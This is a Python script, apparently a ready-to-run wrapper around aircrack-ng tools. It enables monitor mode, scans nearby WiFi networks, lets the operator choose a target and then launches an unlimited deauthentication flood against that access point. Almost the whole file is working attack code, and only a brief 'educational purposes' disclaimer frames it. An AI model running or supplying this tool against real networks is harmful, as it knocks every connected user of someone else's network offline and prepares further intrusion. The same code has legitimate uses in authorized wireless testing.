#!/usr/bin/env python3
"""
WiFi Security Auditing Tool
Enhanced version with improved error handling, logging, and cleanup
For educational and authorized security testing purposes only.
"""

import subprocess
import re
import csv
import os
import time
import shutil
import signal
import sys
import logging
from datetime import datetime
from typing import List, Dict, Optional
from pathlib import Path


class WiFiAuditor:
    """Main class for WiFi security auditing operations"""
    
    def __init__(self):
        self.active_wireless_networks: List[Dict[str, str]] = []
        self.hacknic: Optional[str] = None
        self.monitor_process: Optional[subprocess.Popen] = None
        self.backup_dir = Path.cwd() / "backup"
        self.log_dir = Path.cwd() / "logs"
        self.scanning = True
        
        # Setup logging
        self._setup_logging()
        
        # Register signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _setup_logging(self):
        """Setup logging configuration"""
        self.log_dir.mkdir(exist_ok=True)
        log_file = self.log_dir / f"wifi_audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def _signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        if self.scanning:
            # If we're in scanning mode, stop scanning instead of exit
            self.scanning = False
            # Don't print anything here, let scan_networks handle it
        else:
            # If not scanning, do cleanup and exit
            print("\n\n[!] Interrupt received. Cleaning up...")
            self.logger.info("Interrupt signal received. Initiating cleanup.")
            self.cleanup()
            sys.exit(0)
    
    def get_terminal_size(self):
        """Get current terminal size"""
        try:
            size = os.get_terminal_size()
            return size.columns, size.lines
        except:
            return 80, 24  # Default fallback
    
    def print_banner(self):
        """Display application banner"""
        banner = r"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   █████╗  █████╗ ██████╗ ██╗██████╗ ███████╗███████╗███████╗███╗   ██╗   ║
║  ██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║   ║
║  ███████║███████║██████╔╝██║██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║   ║
║  ██╔══██║██╔══██║██╔══██╗██║██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║   ║
║  ██║  ██║██║  ██║██████╔╝██║██████╔╝███████╗███████╗███████╗██║ ╚████║   ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝   ║
║                                                                          ║
║              WiFi Security Auditing Tool v2.0                            ║
║              For Educational Purposes Only                               ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
        self.logger.info("Application started")
    
    def check_sudo(self) -> bool:
        """Check if running with sudo privileges"""
        if 'SUDO_UID' not in os.environ.keys():
            print("\n[!] Error: This program requires sudo privileges.")
            print("[*] Usage: sudo python3 wifi_auditor.py")
            self.logger.error("Program executed without sudo privileges")
            return False
        return True
    
    def backup_csv_files(self):
        """Backup existing CSV files to prevent conflicts"""
        self.backup_dir.mkdir(exist_ok=True)
        csv_files = list(Path.cwd().glob("*.csv"))
        
        if csv_files:
            print(f"\n[*] Found {len(csv_files)} CSV file(s). Moving to backup...")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            for csv_file in csv_files:
                backup_path = self.backup_dir / f"{timestamp}_{csv_file.name}"
                shutil.move(str(csv_file), str(backup_path))
                self.logger.info(f"Backed up {csv_file.name} to {backup_path}")
            
            print("[✓] Backup completed")
    
    def detect_wifi_interfaces(self) -> List[str]:
        """Detect available wireless interfaces"""
        print("\n[*] Detecting wireless interfaces...")
        wlan_pattern = re.compile(r"^wlan[0-9]+")
        
        try:
            result = subprocess.run(
                ["iwconfig"],
                capture_output=True,
                text=True,
                timeout=10
            )
            interfaces = wlan_pattern.findall(result.stdout)
            
            if interfaces:
                self.logger.info(f"Found wireless interfaces: {interfaces}")
                return interfaces
            else:
                print("\n[!] No wireless interfaces detected.")
                print("[*] Please connect a WiFi adapter and try again.")
                self.logger.error("No wireless interfaces found")
                return []
                
        except subprocess.TimeoutExpired:
            self.logger.error("iwconfig command timed out")
            print("[!] Error: Command timed out")
            return []
        except Exception as e:
            self.logger.error(f"Error detecting interfaces: {e}")
            print(f"[!] Error: {e}")
            return []
    
    def select_interface(self, interfaces: List[str]) -> Optional[str]:
        """Allow user to select a wireless interface"""
        print("\n[*] Available wireless interfaces:")
        for idx, interface in enumerate(interfaces):
            print(f"    [{idx}] {interface}")
        
        while True:
            try:
                choice = input("\n[?] Select interface number: ").strip()
                idx = int(choice)
                
                if 0 <= idx < len(interfaces):
                    selected = interfaces[idx]
                    self.logger.info(f"Selected interface: {selected}")
                    return selected
                else:
                    print("[!] Invalid selection. Please try again.")
            except ValueError:
                print("[!] Please enter a valid number.")
            except KeyboardInterrupt:
                print("\n[!] Selection cancelled.")
                return None
    
    def kill_conflicting_processes(self):
        """Kill processes that may interfere with monitoring"""
        print("\n[*] Killing conflicting processes...")
        try:
            subprocess.run(
                ["sudo", "airmon-ng", "check", "kill"],
                capture_output=True,
                timeout=15
            )
            print("[✓] Conflicting processes terminated")
            self.logger.info("Conflicting processes killed")
            time.sleep(2)
        except Exception as e:
            self.logger.error(f"Error killing processes: {e}")
            print(f"[!] Warning: {e}")
    
    def enable_monitor_mode(self, interface: str) -> bool:
        """Enable monitor mode on the specified interface"""
        print(f"\n[*] Enabling monitor mode on {interface}...")
        try:
            result = subprocess.run(
                ["sudo", "airmon-ng", "start", interface],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                print(f"[✓] Monitor mode enabled: {interface}mon")
                self.logger.info(f"Monitor mode enabled on {interface}")
                self.hacknic = interface
                return True
            else:
                print(f"[!] Failed to enable monitor mode")
                self.logger.error(f"Failed to enable monitor mode: {result.stderr}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error enabling monitor mode: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def start_network_discovery(self) -> bool:
        """Start discovering wireless networks"""
        print("\n[*] Starting network discovery...")
        try:
            self.monitor_process = subprocess.Popen(
                ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1",
                 "--output-format", "csv", f"{self.hacknic}mon"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("[✓] Network discovery started")
            self.logger.info("Network discovery process started")
            time.sleep(3)  # Give time to start capturing
            return True
        except Exception as e:
            self.logger.error(f"Error starting discovery: {e}")
            print(f"[!] Error: {e}")
            return False
    
    def parse_csv_networks(self):
        """Parse CSV files to extract network information"""
        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel',
                     'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power',
                     'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        
        # Clear existing networks to rebuild from CSV
        temp_networks = []
        seen_networks = set()
        
        for csv_file in Path.cwd().glob("file-*.csv"):
            try:
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    f.seek(0)
                    csv_reader = csv.DictReader(f, fieldnames=fieldnames)
                    
                    for row in csv_reader:
                        bssid = row.get("BSSID", "").strip()
                        
                        # Skip header and client data
                        if bssid in ["BSSID", "Station MAC", ""] or not bssid:
                            continue
                        
                        if bssid == "Station MAC":
                            break
                        
                        essid = row.get("ESSID", "").strip()
                        channel = row.get("channel", "").strip()
                        
                        # Only add networks with valid ESSID and avoid duplicates
                        if essid and channel:
                            # Create unique identifier
                            network_id = f"{bssid}|{essid}"
                            
                            if network_id not in seen_networks:
                                seen_networks.add(network_id)
                                temp_networks.append(row)
                            else:
                                # Update power level if network already exists
                                for idx, net in enumerate(temp_networks):
                                    if (net.get("BSSID") == bssid and 
                                        net.get("ESSID") == essid):
                                        # Update with latest power reading
                                        temp_networks[idx] = row
                                        break
                                        
            except Exception as e:
                self.logger.error(f"Error parsing CSV: {e}")
        
        # Update the main list
        self.active_wireless_networks = temp_networks
    
    def truncate_text(self, text: str, max_len: int) -> str:
        """Truncate text to fit width"""
        if len(text) <= max_len:
            return text
        return text[:max_len-3] + "..."
    
    def display_networks(self):
        """Display discovered wireless networks with simple fixed layout"""
        # Use \033c for proper clear that resets cursor position
        print("\033[2J\033[H", end="")
        sys.stdout.flush()
        
        # Simple header
        print("\n" + "="*80)
        print(" "*20 + "DISCOVERED WIRELESS NETWORKS")
        print("="*80)
        print(f"\nTotal Networks: {len(self.active_wireless_networks)}")
        print("Press Ctrl+C to select target\n")
        
        # Simple list format - tidak pakai table yang rumit
        for idx, network in enumerate(self.active_wireless_networks):
            bssid = network.get('BSSID', 'N/A')
            channel = network.get('channel', 'N/A').strip()
            power = network.get('Power', 'N/A').strip()
            privacy = network.get('Privacy', 'N/A').strip()
            essid = network.get('ESSID', 'N/A')
            
            # Signal indicator
            signal = ""
            if power != 'N/A' and power:
                try:
                    power_int = int(power)
                    if power_int >= -50:
                        signal = "[████]"
                    elif power_int >= -60:
                        signal = "[███ ]"
                    elif power_int >= -70:
                        signal = "[██  ]"
                    elif power_int >= -80:
                        signal = "[█   ]"
                    else:
                        signal = "[▁   ]"
                except:
                    signal = ""
            
            # Print dengan format sederhana dan jelas
            print(f"[{idx}] {essid}")
            print(f"    BSSID: {bssid}  |  CH: {channel}  |  Power: {power} {signal}  |  {privacy}")
            print()
        
        # Flush output to ensure it displays immediately
        sys.stdout.flush()
    
    
    def scan_networks(self):
        """Main scanning loop"""
        self.scanning = True
        print("\n[*] Scanning for networks... Press Ctrl+C when ready to select target.\n")
        time.sleep(2)
        
        try:
            while self.scanning:
                self.parse_csv_networks()
                # CLEAR SCREEN THAT ACTUALLY WORKS
                print("\033[2J\033[H", end="")
                self.display_networks()
                time.sleep(0.5)  # smoother refresh
        except Exception as e:
            self.logger.error(f"Error during scanning: {e}")
            print(f"\n[!] Error: {e}")
        
        # When scanning stops, show final list
        if not self.scanning:
            print("\n" + "="*80)
            print("[*] Scanning stopped. Preparing network list...")
            print("="*80 + "\n")
            time.sleep(1)
            self.logger.info("Network scanning stopped by user")
    
    def select_target(self) -> Optional[Dict[str, str]]:
        """Allow user to select a target network"""
        if not self.active_wireless_networks:
            print("\n[!] No networks discovered. Please run scan again.")
            return None
        
        # Clear screen and display final network list
        print("\033c", end="")
        sys.stdout.flush()
        
        print("\n" + "="*80)
        print(" "*25 + "SELECT TARGET NETWORK")
        print("="*80)
        print(f"\nTotal Networks Found: {len(self.active_wireless_networks)}\n")
        
        # Display networks in simple format
        for idx, network in enumerate(self.active_wireless_networks):
            bssid = network.get('BSSID', 'N/A')
            channel = network.get('channel', 'N/A').strip()
            power = network.get('Power', 'N/A').strip()
            privacy = network.get('Privacy', 'N/A').strip()
            essid = network.get('ESSID', 'N/A')
            
            # Signal indicator
            signal = ""
            if power != 'N/A' and power:
                try:
                    power_int = int(power)
                    if power_int >= -50:
                        signal = "[████]"
                    elif power_int >= -60:
                        signal = "[███ ]"
                    elif power_int >= -70:
                        signal = "[██  ]"
                    elif power_int >= -80:
                        signal = "[█   ]"
                    else:
                        signal = "[▁   ]"
                except:
                    signal = ""
            
            print(f"[{idx}] {essid}")
            print(f"    BSSID: {bssid}  |  CH: {channel}  |  Power: {power} {signal}  |  {privacy}")
            print()
        
        print("="*80)
        
        # Input selection
        while True:
            try:
                choice = input("\n[?] Select target network number: ").strip()
                
                if choice == "":
                    continue
                    
                idx = int(choice)
                
                if 0 <= idx < len(self.active_wireless_networks):
                    target = self.active_wireless_networks[idx]
                    self.logger.info(f"Selected target: {target.get('ESSID')} ({target.get('BSSID')})")
                    return target
                else:
                    print(f"[!] Invalid selection. Please enter a number between 0 and {len(self.active_wireless_networks)-1}.")
            except ValueError:
                print("[!] Please enter a valid number.")
            except KeyboardInterrupt:
                print("\n[!] Selection cancelled.")
                return None
    
    def perform_deauth_attack(self, target: Dict[str, str]):
        """Perform deauthentication attack on target"""
        bssid = target.get('BSSID')
        channel = target.get('channel', '').strip()
        essid = target.get('ESSID')
        
        print(f"\n{'='*60}")
        print(f"{'TARGET INFORMATION':^60}")
        print(f"{'='*60}")
        print(f"  ESSID    : {essid}")
        print(f"  BSSID    : {bssid}")
        print(f"  Channel  : {channel}")
        print(f"  Privacy  : {target.get('Privacy', 'N/A')}")
        print(f"{'='*60}")
        
        # Confirm attack
        confirm = input("\n[?] Proceed with deauthentication attack? (y/n): ").strip().lower()
        if confirm != 'y':
            print("[*] Attack cancelled.")
            return
        
        # Set channel
        print(f"\n[*] Setting channel to {channel}...")
        try:
            subprocess.run(
                ["sudo", "airmon-ng", "start", f"{self.hacknic}mon", channel],
                capture_output=True,
                timeout=10
            )
            time.sleep(2)
        except Exception as e:
            self.logger.error(f"Error setting channel: {e}")
            print(f"[!] Error setting channel: {e}")
            return
        
        # Start deauth attack
        print(f"\n[*] Starting deauthentication attack on {essid}...")
        print("[*] Press Ctrl+C to stop the attack\n")
        self.logger.info(f"Starting deauth attack on {bssid}")
        
        # Disable scanning flag so Ctrl+C will trigger cleanup
        self.scanning = False
        
        try:
            subprocess.run(
                ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid,
                 f"{self.hacknic}mon"],
                check=False
            )
        except KeyboardInterrupt:
            print("\n\n[*] Attack stopped by user.")
            self.logger.info("Deauth attack stopped by user")
        except Exception as e:
            self.logger.error(f"Error during attack: {e}")
            print(f"\n[!] Error: {e}")
    
    def cleanup(self):
        """Cleanup and restore system state"""
        print("\n[*] Performing cleanup...")
        
        # Stop monitor process
        if self.monitor_process:
            try:
                self.monitor_process.terminate()
                self.monitor_process.wait(timeout=5)
                print("[✓] Monitoring process stopped")
            except Exception as e:
                self.logger.error(f"Error stopping monitor process: {e}")
                try:
                    self.monitor_process.kill()
                except:
                    pass
        
        # Disable monitor mode
        if self.hacknic:
            print(f"[*] Disabling monitor mode on {self.hacknic}...")
            try:
                subprocess.run(
                    ["sudo", "airmon-ng", "stop", f"{self.hacknic}mon"],
                    capture_output=True,
                    timeout=10
                )
                print("[✓] Monitor mode disabled")
            except Exception as e:
                self.logger.error(f"Error disabling monitor mode: {e}")
        
        # Restart NetworkManager
        print("[*] Restarting NetworkManager...")
        try:
            subprocess.run(
                ["sudo", "systemctl", "start", "NetworkManager"],
                capture_output=True,
                timeout=10
            )
            print("[✓] NetworkManager restarted")
        except Exception as e:
            self.logger.error(f"Error restarting NetworkManager: {e}")
        
        # Backup CSV files
        self.backup_csv_files()
        
        print("\n[✓] Cleanup completed")
        self.logger.info("Cleanup completed successfully")
    
    def run(self):
        """Main execution flow"""
        self.print_banner()
        
        # Check sudo
        if not self.check_sudo():
            return
        
        # Backup existing CSV files
        self.backup_csv_files()
        
        # Detect interfaces
        interfaces = self.detect_wifi_interfaces()
        if not interfaces:
            return
        
        # Select interface
        interface = self.select_interface(interfaces)
        if not interface:
            return
        
        # Kill conflicting processes
        self.kill_conflicting_processes()
        
        # Enable monitor mode
        if not self.enable_monitor_mode(interface):
            return
        
        # Start network discovery
        if not self.start_network_discovery():
            self.cleanup()
            return
        
        # Scan for networks
        self.scan_networks()
        
        # Select target
        target = self.select_target()
        if not target:
            self.cleanup()
            return
        
        # Perform attack
        self.perform_deauth_attack(target)
        
        # Cleanup
        self.cleanup()


def main():
    """Entry point"""
    auditor = WiFiAuditor()
    try:
        auditor.run()
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        print(f"\n[!] Unexpected error: {e}")
        auditor.cleanup()
        sys.exit(1)


if __name__ == "__main__":
    main()